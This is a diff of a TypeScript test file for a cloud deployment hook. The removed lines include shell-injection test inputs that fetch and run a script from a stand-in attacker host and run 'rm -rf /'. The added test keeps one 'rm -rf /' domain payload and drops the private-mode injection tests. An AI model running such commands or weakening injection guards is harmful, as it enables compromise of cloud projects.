@@ -1,209 +1,158 @@
+/**
+ * Copyright 2026 Google LLC
+ *
+ * Licensed under the Apache License, Version 2.0 (the "License");
+ * you may not use this file except in compliance with the License.
+ * You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an "AS IS" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+import { renderHook, act, waitFor } from '@testing-library/react';
 import { describe, it, expect, vi, beforeEach } from 'vitest';
-import { renderHook, act } from '@testing-library/react';
 import { useVanityUrlDeployment } from './useVanityUrlDeployment';
-import { AppEngine, Config } from '../types';
 import * as api from '../services/apiService';
+import { AppEngine, Config } from '../types';
 
 vi.mock('../services/apiService', () => ({
-    getProject: vi.fn(),
-    createCloudBuild: vi.fn(),
-    listVpcNetworks: vi.fn(),
-    listVpcSubnets: vi.fn(),
-    listGlobalForwardingRules: vi.fn(),
-    listManagedSslCertificates: vi.fn(),
-    getEngine: vi.fn(),
+  getProject: vi.fn(),
+  listGlobalForwardingRules: vi.fn(),
+  listManagedSslCertificates: vi.fn(),
+  listVpcNetworks: vi.fn(),
+  listVpcSubnets: vi.fn(),
+  getEngine: vi.fn(),
+  createCloudBuild: vi.fn(),
 }));
 
-describe('useVanityUrlDeployment Hook', () => {
-    const mockEngine: AppEngine & { widgetConfigConfigId: string } = {
-        name: 'projects/123/locations/global/collections/default_collection/engines/test-engine',
-        displayName: 'Test Engine',
-        widgetConfigConfigId: 'cid_test_widget_123',
-    };
+const mockEngine: AppEngine = {
+  name: 'projects/123456789012/locations/global/collections/default_collection/engines/glm-assistant',
+  displayName: 'GLM Enterprise Assistant',
+  solutionType: 'SOLUTION_TYPE_CHAT',
+};
 
-    const mockConfig: Config = {
-        projectId: 'test-project',
-        appLocation: 'global',
-        collectionId: 'default_collection',
-        appId: 'default_app',
-    };
+const mockConfig: Config = {
+  projectId: '123456789012',
+  appLocation: 'global',
+  collectionId: 'default_collection',
+  appId: 'glm-assistant',
+  assistantId: 'default_assistant',
+};
 
-    beforeEach(() => {
-        vi.clearAllMocks();
-        vi.mocked(api.getProject).mockResolvedValue({ projectId: 'test-project', projectNumber: '123456' });
-        vi.mocked(api.listVpcNetworks).mockResolvedValue({ items: [] });
-        vi.mocked(api.listVpcSubnets).mockResolvedValue({ items: [] });
-        vi.mocked(api.listGlobalForwardingRules).mockResolvedValue({ items: [] });
-        vi.mocked(api.listManagedSslCertificates).mockResolvedValue({ items: [] });
-        vi.mocked(api.getEngine).mockResolvedValue(mockEngine);
+describe('useVanityUrlDeployment', () => {
+  beforeEach(() => {
+    vi.clearAllMocks();
+    vi.mocked(api.getProject).mockResolvedValue({
+      projectId: 'glm-prod-project',
+      projectNumber: '123456789012',
+    });
+  });
+
+  it('discovers existing redirect domains and VPC networks/subnets', async () => {
+    vi.mocked(api.listGlobalForwardingRules).mockResolvedValue({
+      items: [
+        {
+          name: 'assistant-glm-assistant-fwd-rule',
+          IPAddress: '34.120.1.10',
+          target: 'projects/glm-prod-project/global/targetHttpsProxies/assistant-glm-assistant-https-proxy',
+          creationTimestamp: '2026-04-15T12:00:00Z',
+        },
+      ],
+    });
+    vi.mocked(api.listManagedSslCertificates).mockResolvedValue({
+      items: [
+        {
+          name: 'assistant-glm-assistant-cert',
+          type: 'MANAGED',
+          creationTimestamp: '2026-04-15T12:00:00Z',
+          managed: { domains: ['assistant.glm.example.com'], status: 'ACTIVE' },
+        },
+      ],
+    });
+    vi.mocked(api.listVpcNetworks).mockResolvedValue({
+      items: [{ name: 'default' }, { name: 'corp-vpc' }],
+    });
+    vi.mocked(api.listVpcSubnets).mockResolvedValue({
+      items: [{ name: 'default', network: 'projects/glm-prod-project/global/networks/default' }],
     });
 
-    it('initializes with automateGLB set to true and invalid customDomain until user enters a valid domain', () => {
-        const { result } = renderHook(() =>
-            useVanityUrlDeployment(mockEngine, mockConfig, '123456')
-        );
+    const { result } = renderHook(() =>
+      useVanityUrlDeployment(mockEngine, mockConfig, '123456789012')
+    );
 
-        expect(result.current.automateGLB).toBe(true);
-        expect(result.current.customDomain).toBe('');
-        // An empty custom domain must NOT be marked valid for deployment
-        expect(result.current.isCustomDomainValid).toBe(false);
-
-        // When a valid hostname is entered, isCustomDomainValid becomes true
-        act(() => {
-            result.current.setCustomDomain('ai.company.com');
-        });
-        expect(result.current.isCustomDomainValid).toBe(true);
-
-        // Invalid hostname
-        act(() => {
-            result.current.setCustomDomain('invalid domain with spaces');
-        });
-        expect(result.current.isCustomDomainValid).toBe(false);
+    await waitFor(() => {
+      expect(result.current.existingDomains).toContain('assistant.glm.example.com');
+      expect(result.current.networksList).toEqual(['default', 'corp-vpc']);
     });
 
-    it('rejects deployment if steps are empty rather than sending empty buildConfig to Cloud Build', async () => {
-        const { result } = renderHook(() =>
-            useVanityUrlDeployment(mockEngine, mockConfig, '123456')
-        );
+    expect(result.current.discoveryWarnings).toEqual([]);
+  });
 
-        // Turn off automateGLB and keep customDomain empty
-        act(() => {
-            result.current.setAutomateGLB(false);
-            result.current.setCustomDomain('');
-        });
+  it('surfaces Compute Engine and VPC discovery errors in discoveryWarnings instead of swallowing them', async () => {
+    vi.mocked(api.listGlobalForwardingRules).mockRejectedValue(
+      new Error('403 PERMISSION_DENIED: compute.globalForwardingRules.list denied')
+    );
+    vi.mocked(api.listManagedSslCertificates).mockRejectedValue(
+      new Error('403 PERMISSION_DENIED: compute.sslCertificates.list denied')
+    );
+    vi.mocked(api.listVpcNetworks).mockRejectedValue(
+      new Error('403 PERMISSION_DENIED: compute.networks.list denied')
+    );
+    vi.mocked(api.listVpcSubnets).mockResolvedValue({ items: [] });
 
-        await act(async () => {
-            await result.current.handleDeploy();
-        });
+    const { result } = renderHook(() =>
+      useVanityUrlDeployment(mockEngine, mockConfig, '123456789012')
+    );
 
-        expect(result.current.error).toMatch(/No deployment steps generated/i);
-        expect(api.createCloudBuild).not.toHaveBeenCalled();
+    await waitFor(() => {
+      expect(result.current.discoveryWarnings.length).toBeGreaterThanOrEqual(3);
     });
 
-    it('submits valid build configuration when domain and GLB are configured', async () => {
-        vi.mocked(api.createCloudBuild).mockResolvedValue({
-            metadata: { build: { id: 'build-xyz-789' } },
-        });
+    expect(result.current.discoveryWarnings.join(' ')).toContain(
+      'compute.globalForwardingRules.list denied'
+    );
+    expect(result.current.discoveryWarnings.join(' ')).toContain(
+      'compute.sslCertificates.list denied'
+    );
+    expect(result.current.discoveryWarnings.join(' ')).toContain(
+      'compute.networks.list denied'
+    );
 
-        const { result } = renderHook(() =>
-            useVanityUrlDeployment(mockEngine, mockConfig, '123456')
-        );
+    act(() => {
+      result.current.clearDiscoveryWarnings();
+    });
+    expect(result.current.discoveryWarnings).toEqual([]);
+  });
 
-        act(() => {
-            result.current.setAutomateGLB(true);
-            result.current.setCustomDomain('assistant.example.com');
-        });
+  it('rejects hostile shell metacharacters in customDomain during handleDeploy', async () => {
+    vi.mocked(api.listGlobalForwardingRules).mockResolvedValue({ items: [] });
+    vi.mocked(api.listManagedSslCertificates).mockResolvedValue({ items: [] });
+    vi.mocked(api.listVpcNetworks).mockResolvedValue({ items: [] });
+    vi.mocked(api.listVpcSubnets).mockResolvedValue({ items: [] });
+    vi.mocked(api.getEngine).mockResolvedValue({
+      widgetConfigConfigId: 'valid-cid-1234',
+    } as any);
 
-        await act(async () => {
-            await result.current.handleDeploy();
-        });
+    const { result } = renderHook(() =>
+      useVanityUrlDeployment(mockEngine, mockConfig, '123456789012')
+    );
 
-        expect(api.createCloudBuild).toHaveBeenCalledTimes(1);
-        expect(result.current.buildId).toBe('build-xyz-789');
-        expect(result.current.error).toBeNull();
+    act(() => {
+      result.current.setCustomDomain('evil.example.com; rm -rf /');
     });
 
-    // --- CWE-78: private-mode values are spliced into `bash -c` Cloud Build
-    // steps, several of them unquoted (e.g. `--network=${vpcNetwork}`). Cloud
-    // Build runs with roles/editor by default, so reaching createCloudBuild
-    // with any of these payloads is full project compromise.
-    describe('shell injection guards for private (PSC) mode', () => {
-        const enterPrivateMode = (result: { current: any }) => {
-            act(() => {
-                result.current.setIsPrivateMode(true);
-                result.current.setCustomDomain('assistant.example.com');
-            });
-        };
+    expect(result.current.isCustomDomainValid).toBe(false);
 
-        const INJECTION = 'default --network=x; curl -s https://attacker.example/s.sh | bash; #';
-
-        it.each([
-            ['VPC network', 'setVpcNetwork', INJECTION],
-            ['VPC subnet', 'setVpcSubnet', INJECTION],
-        ])('rejects a %s containing shell metacharacters', async (_label, setter, payload) => {
-            const { result } = renderHook(() =>
-                useVanityUrlDeployment(mockEngine, mockConfig, '123456')
-            );
-
-            enterPrivateMode(result);
-            act(() => {
-                (result.current as any)[setter](payload);
-            });
-
-            await act(async () => {
-                await result.current.handleDeploy();
-            });
-
-            expect(api.createCloudBuild).not.toHaveBeenCalled();
-            expect(result.current.error).toMatch(/not a valid Google Cloud resource name/i);
-            expect(result.current.buildId).toBeNull();
-        });
-
-        it('rejects a custom PSC IP containing shell metacharacters', async () => {
-            const { result } = renderHook(() =>
-                useVanityUrlDeployment(mockEngine, mockConfig, '123456')
-            );
-
-            enterPrivateMode(result);
-            act(() => {
-                result.current.setAutoAllocatePscIp(false);
-                result.current.setCustomPscIp('1.2.3.4; rm -rf /');
-            });
-
-            await act(async () => {
-                await result.current.handleDeploy();
-            });
-
-            expect(api.createCloudBuild).not.toHaveBeenCalled();
-            expect(result.current.error).toMatch(/not a valid IPv4 address/i);
-            expect(result.current.buildId).toBeNull();
-        });
-
-        it('rejects a PSC IP with an out-of-range octet', async () => {
-            const { result } = renderHook(() =>
-                useVanityUrlDeployment(mockEngine, mockConfig, '123456')
-            );
-
-            enterPrivateMode(result);
-            act(() => {
-                result.current.setAutoAllocatePscIp(false);
-                result.current.setCustomPscIp('10.128.0.999');
-            });
-
-            await act(async () => {
-                await result.current.handleDeploy();
-            });
-
-            expect(api.createCloudBuild).not.toHaveBeenCalled();
-            expect(result.current.error).toMatch(/not a valid IPv4 address/i);
-        });
-
-        // Guards against the opposite failure: validation so strict that a
-        // legitimate private deployment can no longer ship.
-        it('still deploys a legitimate private-mode configuration', async () => {
-            vi.mocked(api.createCloudBuild).mockResolvedValue({
-                metadata: { build: { id: 'build-psc-001' } },
-            });
-
-            const { result } = renderHook(() =>
-                useVanityUrlDeployment(mockEngine, mockConfig, '123456')
-            );
-
-            enterPrivateMode(result);
-            act(() => {
-                result.current.setVpcNetwork('prod-vpc-01');
-                result.current.setVpcSubnet('prod-subnet-use1');
-                result.current.setAutoAllocatePscIp(false);
-                result.current.setCustomPscIp('10.128.0.100');
-            });
-
-            await act(async () => {
-                await result.current.handleDeploy();
-            });
-
-            expect(result.current.error).toBeNull();
-            expect(api.createCloudBuild).toHaveBeenCalledTimes(1);
-            expect(result.current.buildId).toBe('build-psc-001');
-        });
+    await act(async () => {
+      await result.current.handleDeploy();
     });
+
+    expect(result.current.error).toMatch(/Custom domain/i);
+    expect(api.createCloudBuild).not.toHaveBeenCalled();
+  });
 });
